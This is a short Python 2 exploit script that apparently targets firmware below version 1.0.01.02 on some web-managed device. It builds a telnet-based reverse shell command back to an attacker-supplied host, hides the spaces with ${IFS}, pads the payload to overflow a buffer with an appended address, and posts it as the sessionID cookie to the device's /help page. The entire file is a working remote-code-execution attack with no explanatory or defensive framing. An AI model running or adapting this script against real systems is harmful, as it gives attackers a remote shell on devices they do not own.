# Affect firmware version <1.0.01.02
import requests
import urllib3
import sys


if len(sys.argv)!=5:
	print "Parameter error. python exp.py url reverse_shell_host input_port output_port"
	exit(0)


url = sys.argv[1]
reverse_shell_host =  sys.argv[2]
input_port= sys.argv[3]
output_port= sys.argv[4]


if url[-1:]=='/':
   url=url[:-1]


cmd="telnet "+reverse_shell_host+" "+input_port+" | /bin/sh | telnet "+reverse_shell_host+" "+output_port

cmd2=cmd.replace(' ',"${IFS}")


payload = ("sessionID="+cmd2+";").ljust(268,"a")
payload += "\x1c\xb1\x01"


urllib3.disable_warnings()

url= url+"/help"
head= {'Cookie':payload}
r=requests.post(url,headers=head,verify=False)

print(r)
print(r.text)
print(r.content)
